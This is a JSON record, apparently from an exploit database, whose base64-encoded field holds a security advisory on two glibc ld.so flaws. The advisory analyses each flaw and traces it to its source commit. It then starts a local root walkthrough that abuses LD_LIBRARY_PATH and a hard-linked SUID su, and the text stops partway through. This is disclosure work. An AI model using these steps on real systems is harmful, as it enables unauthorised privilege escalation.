{
    "source": "exploit-database", 
    "exploit": "UXVhbHlzIFNlY3VyaXR5IEFkdmlzb3J5DQoNCkJ1ZmZlciBvdmVyZmxvdyBpbiBnbGliYydzIGxkLnNvDQoNCg0KPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQpDb250ZW50cw0KPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQoNClN1bW1hcnkNCk1lbW9yeSBMZWFrDQpCdWZmZXIgT3ZlcmZsb3cNCkV4cGxvaXRhdGlvbg0KQWNrbm93bGVkZ21lbnRzDQoNCg0KPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQpTdW1tYXJ5DQo9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NCg0KV2UgaGF2ZSBkaXNjb3ZlcmVkIGEgbWVtb3J5IGxlYWsgYW5kIGEgYnVmZmVyIG92ZXJmbG93IGluIHRoZSBkeW5hbWljDQpsb2FkZXIgKGxkLnNvKSBvZiB0aGUgR05VIEMgTGlicmFyeSAoZ2xpYmMpOg0KDQotIHRoZSBtZW1vcnkgbGVhayAoQ1ZFLTIwMTctMTAwMDQwOCkgZmlyc3QgYXBwZWFyZWQgaW4gZ2xpYmMgMi4xLjENCiAgKHJlbGVhc2VkIG9uIE1heSAyNCwgMTk5OSkgYW5kIGNhbiBiZSByZWFjaGVkIGFuZCBhbXBsaWZpZWQgdGhyb3VnaA0KICB0aGUgTERfSFdDQVBfTUFTSyBlbnZpcm9ubWVudCB2YXJpYWJsZTsNCg0KLSB0aGUgYnVmZmVyIG92ZXJmbG93IChDVkUtMjAxNy0xMDAwNDA5KSBmaXJzdCBhcHBlYXJlZCBpbiBnbGliYyAyLjUNCiAgKHJlbGVhc2VkIG9uIFNlcHRlbWJlciAyOSwgMjAwNikgYW5kIGNhbiBiZSB0cmlnZ2VyZWQgdGhyb3VnaCB0aGUNCiAgTERfTElCUkFSWV9QQVRIIGVudmlyb25tZW50IHZhcmlhYmxlLg0KDQpGdXJ0aGVyIGludmVzdGlnYXRpb24gc2hvd2VkIHRoYXQ6DQoNCi0gdGhlIGJ1ZmZlciBvdmVyZmxvdyBpcyBub3QgZXhwbG9pdGFibGUgaWYNCiAgL3Byb2Mvc3lzL2ZzL3Byb3RlY3RlZF9oYXJkbGlua3MgaXMgZW5hYmxlZCAoaXQgaXMgbm90IGVuYWJsZWQgYnkNCiAgZGVmYXVsdCBvbiB2YW5pbGxhIExpbnV4IGtlcm5lbHMsIGJ1dCBtb3N0IExpbnV4IGRpc3RyaWJ1dGlvbnMgdHVybiBpdA0KICBvbiBieSBkZWZhdWx0KTsNCg0KLSB0aGUgbWVtb3J5IGxlYWsgYW5kIHRoZSBidWZmZXIgb3ZlcmZsb3cgYXJlIG5vdCBleHBsb2l0YWJsZSBpZiB0aGUNCiAgZ2xpYmMgaXMgcGF0Y2hlZCBhZ2FpbnN0IENWRS0yMDE3LTEwMDAzNjYsIGJlY2F1c2UgdGhpcyBwYXRjaCBpZ25vcmVzDQogIHRoZSBMRF9IV0NBUF9NQVNLIGFuZCBMRF9MSUJSQVJZX1BBVEggZW52aXJvbm1lbnQgdmFyaWFibGVzIHdoZW4gU1VJRA0KICBiaW5hcmllcyBhcmUgZXhlY3V0ZWQgKENWRS0yMDE3LTEwMDAzNjYgd2FzIGZpcnN0IHBhdGNoZWQgaW4gZ2xpYmMNCiAgMi4yNiwgcmVsZWFzZWQgb24gQXVndXN0IDIsIDIwMTcsIGJ1dCBtb3N0IExpbnV4IGRpc3RyaWJ1dGlvbnMgaGFkDQogIGFscmVhZHkgYmFja3BvcnRlZCB0aGlzIHBhdGNoIG9uIEp1bmUgMTksIDIwMTcpLg0KDQpXZSBoYXZlIHRoZXJlZm9yZSByYXRlZCB0aGUgaW1wYWN0IG9mIHRoZXNlIHZ1bG5lcmFiaWxpdGllcyBhcyBMb3cuDQpOZXZlcnRoZWxlc3MsIHdlIGdpdmUgYSBicmllZiBhbmFseXNpcyBvZiB0aGUgdnVsbmVyYWJsZSBmdW5jdGlvbiwgYW5kDQpwcmVzZW50IGEgc2ltcGxlIG1ldGhvZCBmb3IgZXhwbG9pdGluZyBhIFNVSUQgYmluYXJ5IG9uIHRoZSBjb21tYW5kIGxpbmUNCmFuZCBvYnRhaW5pbmcgZnVsbCByb290IHByaXZpbGVnZXMgKGlmIC9wcm9jL3N5cy9mcy9wcm90ZWN0ZWRfaGFyZGxpbmtzDQppcyBub3QgZW5hYmxlZCwgYW5kIENWRS0yMDE3LTEwMDAzNjYgaXMgbm90IHBhdGNoZWQpLg0KDQoNCj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0KTWVtb3J5IExlYWsgKENWRS0yMDE3LTEwMDA0MDgpDQo9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NCg0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpBbmFseXNpcw0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNCkluIF9kbF9pbml0X3BhdGhzKCksIGxkLnNvIG1hbGxvYygpYXRlcyAicnRsZF9zZWFyY2hfZGlycy5kaXJzWzBdIiwgYQ0KY2FjaGUgb2YgaW5mb3JtYXRpb24gYWJvdXQgdGhlIHN5c3RlbSdzIHRydXN0ZWQgZGlyZWN0b3JpZXMgKHR5cGljYWxseQ0KIi9saWIiIGFuZCAiL3Vzci9saWIiIG9uIDMyLWJpdCBvciAiL2xpYjY0IiBhbmQgIi91c3IvbGliNjQiIG9uIDY0LWJpdCkuDQpUbyBjb21wdXRlIHRoZSBudW1iZXIgb2Ygc3lzdGVtIGRpcmVjdG9yaWVzLCBsZC5zbyB1c2VzIHRoZSBjbGFzc2ljIEMNCmlkaW9tICJzaXplb2YgKHN5c3RlbV9kaXJzKSAvIHNpemVvZiAoc3lzdGVtX2RpcnNbMF0pIjoNCg0KIDY5MSAgIHJ0bGRfc2VhcmNoX2RpcnMuZGlyc1swXSA9IChzdHJ1Y3Qgcl9zZWFyY2hfcGF0aF9lbGVtICopDQogNjkyICAgICBtYWxsb2MgKChzaXplb2YgKHN5c3RlbV9kaXJzKSAvIHNpemVvZiAoc3lzdGVtX2RpcnNbMF0pKQ0KIDY5MyAgICAgICAgICAgICAqIHJvdW5kX3NpemUgKiBzaXplb2YgKHN0cnVjdCByX3NlYXJjaF9wYXRoX2VsZW0pKTsNCg0KVW5mb3J0dW5hdGVseSwgInN5c3RlbV9kaXJzIiBpcyBub3QgYSBjbGFzc2ljIGFycmF5OiBpdCBpcyBub3QgYW4gYXJyYXkNCm9mIHN0cmluZ3MgKHBvaW50ZXJzIHRvIGNoYXJhY3RlcnMpLCBidXQgcmF0aGVyIGFuIGFycmF5IG9mIGNoYXJhY3RlcnMsDQp0aGUgY29uY2F0ZW5hdGlvbiBvZiBhbGwgc3lzdGVtIGRpcmVjdG9yaWVzLCBzZXBhcmF0ZWQgYnkgbnVsbCBieXRlczoNCg0KIDEwOSBzdGF0aWMgY29uc3QgY2hhciBzeXN0ZW1fZGlyc1tdID0gU1lTVEVNX0RJUlM7DQoNCndoZXJlICJTWVNURU1fRElSUyIgaXMgZ2VuZXJhdGVkIGJ5ICJnZW4tdHJ1c3RlZC1kaXJzLmF3ayIgKHR5cGljYWxseQ0KIi9saWIvAC91c3IvbGliLyIgb24gMzItYml0IG9yICIvbGliNjQvAC91c3IvbGliNjQvIiBvbiA2NC1iaXQpLiBBcyBhDQpyZXN1bHQsIHRoZSBudW1iZXIgb2Ygc3lzdGVtIGRpcmVjdG9yaWVzIGlzIG92ZXJlc3RpbWF0ZWQsIGFuZCB0b28gbXVjaA0KbWVtb3J5IGlzIGFsbG9jYXRlZCBmb3IgInJ0bGRfc2VhcmNoX2RpcnMuZGlyc1swXSI6IGlmICJzeXN0ZW1fZGlycyIgaXMNCiIvbGliLwAvdXNyL2xpYi8iIGZvciBleGFtcGxlLCB0aGUgbnVtYmVyIG9mIHN5c3RlbSBkaXJlY3RvcmllcyBpcyAyLA0KYnV0IDE2IGlzIHVzZWQgaW5zdGVhZCAodGhlIG51bWJlciBvZiBjaGFyYWN0ZXJzIGluICJzeXN0ZW1fZGlycyIpIHRvDQpjb21wdXRlIHRoZSBzaXplIG9mICJydGxkX3NlYXJjaF9kaXJzLmRpcnNbMF0iLg0KDQpUaGlzIGV4dHJhIG1lbW9yeSBpcyBuZXZlciBhY2Nlc3NlZCwgbmV2ZXIgZnJlZWQsIGFuZCBtb3N0bHkgZmlsbGVkIHdpdGgNCm51bGwgYnl0ZXMsIGJlY2F1c2Ugb25seSB0aGUgaW5mb3JtYXRpb24gYWJvdXQgIm5zeXN0ZW1fZGlyc19sZW4iIHN5c3RlbQ0KZGlyZWN0b3JpZXMgKHRoZSBjb3JyZWN0IG51bWJlciBvZiBzeXN0ZW0gZGlyZWN0b3JpZXMpIGlzIHdyaXR0ZW4gdG8NCiJydGxkX3NlYXJjaF9kaXJzLmRpcnNbMF0iLCBhbmQgYmVjYXVzZSB0aGUgbWluaW1hbCBtYWxsb2MoKQ0KaW1wbGVtZW50YXRpb24gaW4gbGQuc28gY2FsbHMgbW1hcCgpLCBidXQgbmV2ZXIgbXVubWFwKCkuDQoNCk1vcmVvdmVyLCB0aGlzIG1lbW9yeSBsZWFrIGNhbiBiZSBhbXBsaWZpZWQgdGhyb3VnaCB0aGUgTERfSFdDQVBfTUFTSw0KZW52aXJvbm1lbnQgdmFyaWFibGUsIGJlY2F1c2UgbGQuc28gdXNlcyAibmNhcHN0ciIgKHRoZSB0b3RhbCBudW1iZXIgb2YNCmhhcmR3YXJlLWNhcGFiaWxpdHkgY29tYmluYXRpb25zKSB0byBjb21wdXRlIHRoZSBzaXplIG9mDQoicnRsZF9zZWFyY2hfZGlycy5kaXJzWzBdIjoNCg0KIDY4NyAgIHJvdW5kX3NpemUgPSAoKDIgKiBzaXplb2YgKHN0cnVjdCByX3NlYXJjaF9wYXRoX2VsZW0pIC0gMQ0KIDY4OCAgICAgICAgICAgICAgICAgICsgbmNhcHN0ciAqIHNpemVvZiAoZW51bSByX2Rpcl9zdGF0dXMpKQ0KIDY4OSAgICAgICAgICAgICAgICAgLyBzaXplb2YgKHN0cnVjdCByX3NlYXJjaF9wYXRoX2VsZW0pKTsNCg0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpIaXN0b3J5DQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCg0KV2UgdHJhY2tlZCBkb3duIHRoaXMgdnVsbmVyYWJpbGl0eSB0bzoNCg0KY29tbWl0IGFiN2ViMjkyMzA3MTUyZTcwNjk0OGE3YjE5MTY0ZmY1ZTZkNTkzZDQNCkRhdGU6ICAgTW9uIE1heSAzIDIxOjU5OjM1IDE5OTkgKzAwMDANCg0KICAgIFVwZGF0ZS4NCg0KICAgICAgICAqIGVsZi9NYWtlZmlsZSAodHJ1c3RlZC1kaXJzLnN0KTogVXNlIGdlbi10cnVzdGVkLWRpcnMuYXdrLg0KICAgICAgICAqIGVsZi9nZW4tdHJ1c3RlZC1kaXJzLmF3azogTmV3IGZpbGUuDQogICAgICAgICogZWxmL2RsLWxvYWQuYyAoc3lzdGVtc19kaXJzKTogTW92ZWQgaW50byBmaWxlIHNjb3BlLiAgSW5pdGlhbGl6ZQ0KICAgICAgICBmcm9tIFNZU1RFTV9ESVJTIG1hY3JvLg0KICAgICAgICAoc3lzdGVtX2RpcnNfbGVuKTogTmV3IHZhcmlhYmxlLiAgQ29udGFpbnMgbGVuZ3RocyBvZiBzeXN0ZW1fZGlycw0KICAgICAgICBzdHJpbmdzLg0KICAgICAgICAoZmlsbGluX3JwYXRoKTogUmV3cml0ZSBmb3Igc3lzdGVtc19kaXJzIGJlaW5nIGEgc2ltcGxlIHN0cmluZy4NCiAgICAgICAgSW1wcm92ZSBzdHJpbmcgY29tcGFyaXNvbnMuICBDaGFuZ2UgcGFyYW1ldGVyIHRydXN0ZWQgdG8gYmUgYSBmbGFnLg0KICAgICAgICBDaGFuZ2UgYWxsIGNhbGxlcnMuDQogICAgICAgIChfZHRfaW5pdF9wYXRocyk6IEltcHJvdmUgdXNpbmcgbmV3IGZvcm1hdCBmb3Igc3lzdGVtX2RpcnMuDQoNCndoaWNoIHRyYW5zZm9ybWVkICJzeXN0ZW1fZGlycyIgZnJvbSBhbiBhcnJheSBvZiBzdHJpbmdzIChwb2ludGVycyB0bw0KY2hhcmFjdGVycykgaW50byBhbiBhcnJheSBvZiBjaGFyYWN0ZXJzOg0KDQotICBzdGF0aWMgY29uc3QgY2hhciAqc3lzdGVtX2RpcnNbXSA9DQotICB7DQotI2luY2x1ZGUgInRydXN0ZWQtZGlycy5oIg0KLSAgICBOVUxMDQotICB9Ow0KLi4uDQorc3RhdGljIGNvbnN0IGNoYXIgc3lzdGVtX2RpcnNbXSA9IFNZU1RFTV9ESVJTOw0KDQoNCj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0KQnVmZmVyIE92ZXJmbG93IChDVkUtMjAxNy0xMDAwNDA5KQ0KPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQoNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KQW5hbHlzaXMNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KDQpJbiBfZGxfaW5pdF9wYXRocygpLCBsZC5zbyBjb21wdXRlcyAibmxscCIsIHRoZSBudW1iZXIgb2YNCmNvbG9uLXNlcGFyYXRlZCBkaXJlY3RvcmllcyBpbiAibGxwIiAodGhlIExEX0xJQlJBUllfUEFUSCBlbnZpcm9ubWVudA0KdmFyaWFibGUpLCBtYWxsb2MoKWF0ZXMgImVudl9wYXRoX2xpc3QuZGlycyIsIGFuIGFycmF5IG9mICJubGxwICsgMSINCnBvaW50ZXJzIHRvICJyX3NlYXJjaF9wYXRoX2VsZW0iIHN0cnVjdHVyZXMgKG9uZSBmb3IgZWFjaCBkaXJlY3RvcnkgaW4NCiJsbHAiLCBwbHVzIGEgdGVybWluYXRpbmcgTlVMTCBwb2ludGVyKSwgYW5kIGNhbGxzIGZpbGxpbl9ycGF0aCgpIHRvDQpmaWxsIGluICJlbnZfcGF0aF9saXN0LmRpcnMiOg0KDQogNzc3ICAgaWYgKGxscCAhPSBOVUxMICYmICpsbHAgIT0gJwAnKQ0KIDc3OCAgICAgew0KIDc3OSAgICAgICBzaXplX3QgbmxscDsNCiA3ODAgICAgICAgY29uc3QgY2hhciAqY3AgPSBsbHA7DQogNzgxICAgICAgIGNoYXIgKmxscF90bXA7DQogLi4uDQogODAzICAgICAgIG5sbHAgPSAxOw0KIDgwNCAgICAgICB3aGlsZSAoKmNwKQ0KIDgwNSAgICAgICAgIHsNCiA4MDYgICAgICAgICAgIGlmICgqY3AgPT0gJzonIHx8ICpjcCA9PSAnOycpDQogODA3ICAgICAgICAgICAgICsrbmxscDsNCiA4MDggICAgICAgICAgICsrY3A7DQogODA5ICAgICAgICAgfQ0KIDgxMCANCiA4MTEgICAgICAgZW52X3BhdGhfbGlzdC5kaXJzID0gKHN0cnVjdCByX3NlYXJjaF9wYXRoX2VsZW0gKiopDQogODEyICAgICAgICAgbWFsbG9jICgobmxscCArIDEpICogc2l6ZW9mIChzdHJ1Y3Qgcl9zZWFyY2hfcGF0aF9lbGVtICopKTsNCiAuLi4NCiA4MTkgICAgICAgKHZvaWQpIGZpbGxpbl9ycGF0aCAobGxwX3RtcCwgZW52X3BhdGhfbGlzdC5kaXJzLCAiOjsiLA0KIDgyMCAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX2xpYmNfZW5hYmxlX3NlY3VyZSwgIkxEX0xJQlJBUllfUEFUSCIsDQogODIxICAgICAgICAgICAgICAgICAgICAgICAgICAgIE5VTEwsIGwpOw0KDQpVbmZvcnR1bmF0ZWx5LCBsZC5zbyBwYXJzZXMgdGhlICJsbHAiIHN0cmluZyB0byBjb21wdXRlICJubGxwIiBidXQNCnBhcnNlcyB0aGUgImxscF90bXAiIHN0cmluZyAoYW4gZXhwYW5kZWQgY29weSBvZiAibGxwIikgdG8gZmlsbCBpbg0KImVudl9wYXRoX2xpc3QuZGlycyIuIEFzIGEgcmVzdWx0LCB0aGUgbnVtYmVyIG9mIHBvaW50ZXJzIHdyaXR0ZW4gdG8NCiJlbnZfcGF0aF9saXN0LmRpcnMiIGNhbiBiZSBncmVhdGVyIHRoYW4gIm5sbHAgKyAxIiAoYW4gbW1hcCgpLWJhc2VkDQpidWZmZXIgb3ZlcmZsb3cpIGlmIHRoZSBjb250ZW50cyBvZiAibGxwX3RtcCIgZGlmZmVyIGZyb20gdGhlIGNvbnRlbnRzDQpvZiAibGxwIiAoaWYgImxscF90bXAiIGNvbnRhaW5zIG1vcmUgY29sb25zIHRoYW4gImxscCIpOg0KDQogNzg0ICAgICAgIC8qIEV4cGFuZCBEU1RzLiAgKi8NCiA3ODUgICAgICAgc2l6ZV90IGNudCA9IERMX0RTVF9DT1VOVCAobGxwLCAxKTsNCiA3ODYgICAgICAgaWYgKF9fZ2xpYmNfbGlrZWx5IChjbnQgPT0gMCkpDQogNzg3ICAgICAgICAgbGxwX3RtcCA9IHN0cmR1cGEgKGxscCk7DQogNzg4ICAgICAgIGVsc2UNCiA3ODkgICAgICAgICB7DQogNzkwICAgICAgICAgICAvKiBEZXRlcm1pbmUgdGhlIGxlbmd0aCBvZiB0aGUgc3Vic3RpdHV0ZWQgc3RyaW5nLiAgKi8NCiA3OTEgICAgICAgICAgIHNpemVfdCB0b3RhbCA9IERMX0RTVF9SRVFVSVJFRCAobCwgbGxwLCBzdHJsZW4gKGxscCksIGNudCk7DQogNzkyIA0KIDc5MyAgICAgICAgICAgLyogQWxsb2NhdGUgdGhlIG5lY2Vzc2FyeSBtZW1vcnkuICAqLw0KIDc5NCAgICAgICAgICAgbGxwX3RtcCA9IChjaGFyICopIGFsbG9jYSAodG90YWwgKyAxKTsNCiA3OTUgICAgICAgICAgIGxscF90bXAgPSBfZGxfZHN0X3N1YnN0aXR1dGUgKGwsIGxscCwgbGxwX3RtcCwgMSk7DQogNzk2ICAgICAgICAgfQ0KDQpUaGUgRHluYW1pYyBTdHJpbmcgVG9rZW5zIChEU1RzKSAkTElCIGFuZCAkUExBVEZPUk0gYXJlIGV4cGFuZGVkIHRvDQpmaXhlZCBzdHJpbmdzIHRoYXQgZG8gbm90IGNvbnRhaW4gY29sb25zICh0eXBpY2FsbHkgImxpYiIgYW5kICJpNjg2IiBvbg0KMzItYml0IG9yICJsaWI2NCIgYW5kICJ4ODZfNjQiIG9uIDY0LWJpdCksIGJ1dCB0aGUgZXhwYW5zaW9uIG9mICRPUklHSU4NCih0aGUgZGlyZWN0b3J5IG9mIHRoZSBiaW5hcnkgYmVpbmcgZXhlY3V0ZWQpIGNhbiBpbmplY3QgZXh0cmEgY29sb25zDQppbnRvICJsbHBfdG1wIiBhbmQgaGVuY2UgZXh0cmEgcG9pbnRlcnMgaW50byAiZW52X3BhdGhfbGlzdC5kaXJzIi4NCg0KVG8gZXhwbG9pdCB0aGlzIGJ1ZmZlciBvdmVyZmxvdywgYSBsb2NhbCBhdHRhY2tlciBtdXN0IHRoZXJlZm9yZSBiZSBhYmxlDQp0bzoNCg0KLSBoYXJkLWxpbmsgYSBTVUlEIGJpbmFyeSBpbnRvIGEgZGlyZWN0b3J5IHdob3NlIHBhdGhuYW1lIGNvbnRhaW5zDQogIGNvbG9ucyAoaS5lLiwgL3Byb2Mvc3lzL2ZzL3Byb3RlY3RlZF9oYXJkbGlua3MgbXVzdCBub3QgYmUgZW5hYmxlZCk7DQoNCi0gcGFzcyB0aGUgTERfTElCUkFSWV9QQVRIIGVudmlyb25tZW50IHZhcmlhYmxlIHRvIF9kbF9pbml0X3BhdGhzKCkNCiAgKGkuZS4sIENWRS0yMDE3LTEwMDAzNjYgbXVzdCBub3QgYmUgcGF0Y2hlZCkuDQoNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KSGlzdG9yeQ0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNCldlIHRyYWNrZWQgZG93biB0aGlzIHZ1bG5lcmFiaWxpdHkgdG86DQoNCmNvbW1pdCA5NTAzOThlMTMyMDI1NTU3MmY0MjI4ZGI5NDM0NGRjZDVmNjEzNDU1DQpEYXRlOiAgIFR1ZSBBdWcgMjkgMDE6NDQ6MjcgMjAwNiArMDAwMA0KDQogICAgKiBlbGYvZGwtbG9hZC5jIChfZGxfaW5pdF9wYXRocyk6IEV4cGFuZCBEU1RzLg0KDQp3aGljaCBhZGRlZCB0aGUgZXhwYW5zaW9uIG9mIGxscCdzIER5bmFtaWMgU3RyaW5nIFRva2VucyAoRFNUcykgdG8NCl9kbF9pbml0X3BhdGhzKCk6DQoNCi0gICAgICBjaGFyICpsbHBfdG1wID0gc3RyZHVwYSAobGxwKTsNCisgICAgICBjaGFyICpsbHBfdG1wOw0KLi4uDQorICAgICAgLyogRXhwYW5kIERTVHMuICAqLw0KKyAgICAgIHNpemVfdCBjbnQgPSBETF9EU1RfQ09VTlQgKGxscCwgMSk7DQorICAgICAgaWYgKF9fYnVpbHRpbl9leHBlY3QgKGNudCA9PSAwLCAxKSkNCisgICAgICAgbGxwX3RtcCA9IHN0cmR1cGEgKGxscCk7DQorICAgICAgZWxzZQ0KKyAgICAgICB7DQorICAgICAgICAgLyogRGV0ZXJtaW5lIHRoZSBsZW5ndGggb2YgdGhlIHN1YnN0aXR1dGVkIHN0cmluZy4gICovDQorICAgICAgICAgc2l6ZV90IHRvdGFsID0gRExfRFNUX1JFUVVJUkVEIChsLCBsbHAsIHN0cmxlbiAobGxwKSwgY250KTsNCisNCisgICAgICAgICAvKiBBbGxvY2F0ZSB0aGUgbmVjZXNzYXJ5IG1lbW9yeS4gICovDQorICAgICAgICAgbGxwX3RtcCA9IChjaGFyICopIGFsbG9jYSAodG90YWwgKyAxKTsNCisgICAgICAgICBsbHBfdG1wID0gX2RsX2RzdF9zdWJzdGl0dXRlIChsLCBsbHAsIGxscF90bXAsIDEpOw0KKyAgICAgICB9DQoNCg0KPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQpFeHBsb2l0YXRpb24NCj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0KDQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCkRlYmlhbiA5IChpMzg2KQ0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNCkluIHRoaXMgZXhhbXBsZSwgd2UgZXhwbG9pdCB0aGUgU1VJRC1yb290IGJpbmFyeSAic3UiIG9uIGEgMzItYml0IERlYmlhbg0KOS4wOiB3ZSBpbnN0YWxsZWQgImRlYmlhbi05LjAuMC1pMzg2LXhmY2UtQ0QtMS5pc28iICh0aGUgbGFzdCByZWxlYXNlDQpiZWZvcmUgZ2xpYmMncyBDVkUtMjAxNy0xMDAwMzY2IHdhcyBwYXRjaGVkKSwgYW5kIG1hbnVhbGx5IGRpc2FibGVkDQpwcm90ZWN0ZWRfaGFyZGxpbmtzICgiZWNobyAwID4gL3Byb2Mvc3lzL2ZzL3Byb3RlY3RlZF9oYXJkbGlua3MiKS4NCg0KMS8gRmlyc3QsIHdlIGlkZW50aWZ5IHRoZSBzeXN0ZW0ncyB0cnVzdGVkIGRpcmVjdG9yaWVzICh0aGUgb25seQ0KZGlyZWN0b3JpZXMgYWNjZXB0ZWQgYnkgZmlsbGluX3JwYXRoKCkgd2hlbiBleGVjdXRpbmcgYSBTVUlEIGJpbmFyeSk6DQoNCiQgZW52IC1pIExEX1BSRUxPQUQ9bm9uZXhpc3RlbnQgTERfSFdDQVBfTUFTSz0wIExEX0RFQlVHPWxpYnMgZW52IDI+JjEgfCBoZWFkDQogICAgICAxNjA3OiAgICAgZmluZCBsaWJyYXJ5PW5vbmV4aXN0ZW50IFswXTsgc2VhcmNoaW5nDQogICAgICAxNjA3OiAgICAgIHNlYXJjaCBjYWNoZT0vZXRjL2xkLnNvLmNhY2hlDQogICAgICAxNjA3OiAgICAgIHNlYXJjaCBwYXRoPS9saWIvaTM4Ni1saW51eC1nbnUvdGxzL2k2ODY6L2xpYi9pMzg2LWxpbnV4LWdudS90bHM6L2xpYi9pMzg2LWxpbnV4LWdudS9pNjg2Oi9saWIvaTM4Ni1saW51eC1nbnU6L3Vzci9saWIvaTM4Ni1saW51eC1nbnUvdGxzL2k2ODY6L3Vzci9saWIvaTM4Ni1saW51eC1nbnUvdGxzOi91c3IvbGliL2kzODYtbGludXgtZ251L2k2ODY6L3Vzci9saWIvaTM4Ni1saW51eC1nbnU6L2xpYi90bHMvaTY4NjovbGliL3RsczovbGliL2k2ODY6L2xpYjovdXNyL2xpYi90bHMvaTY4NjovdXNyL2xpYi90bHM6L3Vzci9saWIvaTY4NjovdXNyL2xpYiAgICAgICAgICAgIChzeXN0ZW0gc2VhcmNoIHBhdGgpDQogICAgICAxNjA3OiAgICAgICB0cnlpbmcgZmlsZT0vbGliL2kzODYtbGludXgtZ251L3Rscy9pNjg2L25vbmV4aXN0ZW50DQogICAgICAxNjA3OiAgICAgICB0cnlpbmcgZmlsZT0vbGliL2kzODYtbGludXgtZ251L3Rscy9ub25leGlzdGVudA0KICAgICAgMTYwNzogICAgICAgdHJ5aW5nIGZpbGU9L2xpYi9pMzg2LWxpbnV4LWdudS9pNjg2L25vbmV4aXN0ZW50DQogICAgICAxNjA3OiAgICAgICB0cnlpbmcgZmlsZT0vbGliL2kzODYtbGludXgtZ251L25vbmV4aXN0ZW50DQogICAgICAxNjA3OiAgICAgICB0cnlpbmcgZmlsZT0vdXNyL2xpYi9pMzg2LWxpbnV4LWdudS90bHMvaTY4Ni9ub25leGlzdGVudA0KICAgICAgMTYwNzogICAgICAgdHJ5aW5nIGZpbGU9L3Vzci9saWIvaTM4Ni1saW51eC1nbnUvdGxzL25vbmV4aXN0ZW50DQogICAgICAxNjA3OiAgICAgICB0cnlpbmcgZmlsZT0vdXNyL2xpYi9pMzg2LWxpbnV4LWdudS9pNjg2L25vbmV4aXN0ZW50DQoNClRoZSAic3lzdGVtIHNlYXJjaCBwYXRoIiBsaW5lIHNob3dzIGZvdXIgc3lzdGVtIGRpcmVjdG9yaWVzOg0KIi9saWIvaTM4Ni1saW51eC1nbnUiLCAiL3Vzci9saWIvaTM4Ni1saW51eC1nbnUiLCAiL2xpYiIsIGFuZCAiL3Vzci9saWIiDQooInRscyIgYW5kICJpNjg2IiBhcmUgZGVmYXVsdCBoYXJkd2FyZSBjYXBhYmlsaXRpZXMgdGhhdCBhcmUgZW5hYmxlZA0KZXZlbiBpZiBMRF9IV0NBUF9NQVNLIGlzIDApLg0KDQoyLyBTZWNvbmQsIHdlIGNyZWF0ZSBvdXIgJE9SSUdJTiBkaXJlY3RvcnkgYW5kIGhhcmQtbGluayB0aGUgU1VJRC1yb290DQpiaW5hcnkgInN1IiBpbnRvIGl0Og0KDQokIG1rZGlyIC1wICcvdmFyL3RtcC86L2xpYjovdXNyL2xpYjonDQoNCiQgY2QgJy92YXIvdG1wLzovbGliOi91c3IvbGliOicNCg0KJCBsbiBgd2hpY2ggc3VgIC4NCg0KVGhlIHBhdGhuYW1lIG9mIG91ciAkT1JJR0lOIGRpcmVjdG9yeSBjb250YWlucyB0d28gc3lzdGVtIGRpcmVjdG9yaWVzOg0Kd2Ugd2lsbCB3cml0ZSAxMiBieXRlcyAoMyBwb2ludGVyczogb25lIGZvciBlYWNoIHN5c3RlbSBkaXJlY3RvcnksIHBsdXMNCmEgdGVybWluYXRpbmcgTlVMTCBwb2ludGVyKSB0byBhbiA4LWJ5dGUgImVudl9wYXRoX2xpc3